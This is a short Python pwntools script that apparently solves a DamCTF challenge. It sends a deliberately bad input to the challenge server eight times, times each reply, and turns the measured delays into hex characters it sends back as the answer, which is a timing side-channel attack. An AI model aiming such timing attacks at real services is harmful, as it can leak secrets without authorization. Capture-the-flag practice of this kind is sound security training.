import sys
import socket
import time

from pwn import *

genString = "0123456789abcdef"

hostname = "chals.damctf.xyz" 
port = int(30318)

time1 = 0
time2 = 0
timediff = []

conn = remote(hostname, port)


for x in range(0, 6):
	conn.recvline()


#This section will go through and send intentionally bad results
#This will trigger the sleep timer in the code that we can measure
for x in range(0, 8):
	time1 = time.time()

	conn.sendline(b"z")

	conn.recvline()

	time2 = time.time()

	#print("Time took: " + str(time2 - time1))

	timediff.append(time2 - time1)


for x in range(0, 8):
	#This line below formats the time to 1 decimal, multiplies it by 10,
	#Than grabs that element from the string and sends it
	conn.sendline(genString[int(timediff[x] * 10)])
	conn.recvline()

for x in range(0, 8):
	#For testing the timing 
	print(timediff[x])


conn.interactive()